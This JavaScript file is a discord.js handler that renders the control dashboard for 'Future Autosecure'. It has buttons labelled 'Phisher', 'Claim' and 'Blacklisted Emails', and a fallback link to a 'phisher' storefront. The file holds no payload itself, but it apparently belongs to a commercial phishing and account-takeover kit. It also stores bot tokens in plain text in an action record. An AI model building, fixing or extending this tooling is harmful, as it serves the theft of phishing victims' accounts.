const { queryParams } = require("../../../db/database");
const { autosecureMap } = require("../../../mainbot/handlers/botHandler");
const {
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder
} = require("discord.js");
const generate = require("../utils/generate");

module.exports = async function showbotmsg(userid, botnumber, id, client) {
  let hidebuttons = false;

  const result = await queryParams(
    "SELECT * FROM autosecure WHERE user_id = ? AND botnumber = ?",
    [id, botnumber]
  );

  if (!result || result.length === 0) {
    return {
      content: "❌ Bot not found in database. Please report this issue.",
      ephemeral: true
    };
  }

  const mapKey = `${id}|${botnumber}`;
  const c = autosecureMap.get(mapKey);
  if (client.isuserbot) hidebuttons = true;

  /* ───────── BOT NAMES ───────── */
  let currentName = "Unknown";
  let oldName = "Unknown";

  if (c) {
    currentName = c.user.tag;
    await queryParams(
      "UPDATE autosecure SET lastsavedname = ? WHERE user_id = ? AND botnumber = ?",
      [currentName, id, botnumber]
    );
  }

  const oldNameRes = await queryParams(
    "SELECT lastsavedname FROM autosecure WHERE user_id = ? AND botnumber = ?",
    [id, botnumber]
  );
  if (oldNameRes.length && oldNameRes[0].lastsavedname) {
    oldName = oldNameRes[0].lastsavedname;
  }

  /* ───────── TIME & STATUS ───────── */
  const createdAt = new Date(result[0].creationdate * 1000);
  const createdFmt = createdAt.toISOString().replace("T", " ").slice(0, 19);
  const sessionStart = c ? Math.floor((Date.now() - c.uptime) / 1000) : null;

  const avatar =
    c?.user?.displayAvatarURL() ||
    "https://media.tenor.com/ZlZZTd366EYAAAAe/we-have-no-sappers-dog-accepting-fate.png";

  const statusText = c ? "🟢 ONLINE" : "🔴 OFFLINE";
  const statusColor = c ? 0x2ECC71 : 0xE74C3C;

  /* ───────── WIDE DASHBOARD EMBED ───────── */
  const embed = new EmbedBuilder()
    .setColor(statusColor)
    .setTitle("<a:bots:1459163572323225661> AUTOSECURE — BOT CONTROL DASHBOARD")
    .setThumbnail(avatar)
    .setDescription(
      "**━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━**\n" +
      "## BOT STATUS\n\n" +
      `### ${statusText}\n\n` +
      "**Bot Slot**\n" +
      `#${botnumber}\n\n` +
      "**Owner**\n" +
      `<@${id}>\n\n` +
      "**━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━**"
    )
    .addFields(
      {
        name: "<:Soft_Bots:1459163368912060538> BOT IDENTITY",
        value:
          `**<a:arrow:1458743487229853738> Old Name**\n\`${oldName}\`\n\n` +
          `**<a:arrow:1458743487229853738> Current Name**\n\`${currentName}\``,
        inline: true
      },
      {
        name: "<:info:1458743494863491226> SESSION",
        value: c
          ? `**Started**\n<t:${sessionStart}:R>\n\n**State**\nRunning`
          : "**State**\nOffline",
        inline: true
      },
      {
        name: "<:NewProject623EA6ADE:1458743491999039508> LIFECYCLE",
        value:
          `**Created On**\n\`${createdFmt}\`\n\n` +
          `**Restart Safe**\nYes`,
        inline: true
      },
      {
        name: "<a:pin:1458743490715582485> IMPORTANT NOTICE",
        value:
          "**Changes may take up to 30 seconds to apply.**\n" +
          "Avoid clicking buttons repeatedly while processing.",
        inline: false
      }
    )
    .setFooter({
      text: "Powered by Future Autosecure"
    })
    .setTimestamp();

  if (!c) {
    embed.addFields({
      name: "BOT OFFLINE ACTION REQUIRED",
      value:
        "**This bot is currently OFFLINE.**\n\n" +
        "You can:\n" +
        "• Restart the bot\n" +
        "• Replace the token\n" +
        "• Reconfigure settings",
      inline: false
    });
  }

  /* ───────── ACTION TRACKING ───────── */
  const actionId = generate(32);
  await queryParams(
    "INSERT INTO actions (id, action) VALUES (?, ?)",
    [actionId, `restart|${id}|${botnumber}|${result[0].token}|${c ? "offline" : "online"}`]
  );

  const inviteLink = c
    ? `https://discord.com/oauth2/authorize?client_id=${c.user.id}&permissions=8&scope=bot+applications.commands`
    : null;

  /* ───────── BUTTON ROWS ───────── */
  const row1 = new ActionRowBuilder();
  if (userid === id) {
    row1.addComponents(
      new ButtonBuilder()
        .setLabel("Invite Bot")
        .setStyle(ButtonStyle.Link)
        .setURL(inviteLink || "https://phisher.mysellauth.com/")
        .setDisabled(!c)
    );
  }

  row1.addComponents(
    new ButtonBuilder().setLabel("Edit Bot").setStyle(ButtonStyle.Primary).setCustomId(`editbot|${botnumber}|${id}|${hidebuttons ? 1 : 0}`),
    new ButtonBuilder().setLabel("Autosecure").setStyle(ButtonStyle.Primary).setCustomId(`editautosecure|${botnumber}|${id}`),
    new ButtonBuilder().setLabel("Phisher").setStyle(ButtonStyle.Primary).setCustomId(`editphisher|${botnumber}|${id}`),
    new ButtonBuilder().setLabel("Claim").setStyle(ButtonStyle.Primary).setCustomId(`claimusers|${botnumber}|${id}`)
  );

  const row2 = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setLabel("Edit Embeds").setStyle(ButtonStyle.Secondary).setCustomId(`editembeds|${botnumber}|${id}`),
    new ButtonBuilder().setLabel("Edit Buttons").setStyle(ButtonStyle.Secondary).setCustomId(`editbuttons|${botnumber}|${id}`),
    new ButtonBuilder().setLabel("Edit Modals").setStyle(ButtonStyle.Secondary).setCustomId(`editmodals|${botnumber}|${id}`),
    new ButtonBuilder().setLabel("Edit Presets").setStyle(ButtonStyle.Secondary).setCustomId(`editpresets|${botnumber}|${id}`)
  );

  const row3 = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setLabel("Blacklisted Users").setStyle(ButtonStyle.Success).setCustomId(`blacklistedusers|${botnumber}|${id}`),
    new ButtonBuilder().setLabel("Blacklisted Emails").setStyle(ButtonStyle.Success).setCustomId(`blacklistedemails|${botnumber}|${id}`)
  );

  if (!hidebuttons) {
    row3.addComponents(
      new ButtonBuilder().setLabel("Download Config").setStyle(ButtonStyle.Secondary).setCustomId(`botsconfig|${botnumber}|${id}`)
    );
  }

  return {
    embeds: [embed],
    components: [row1, row2, row3],
    ephemeral: true
  };
};
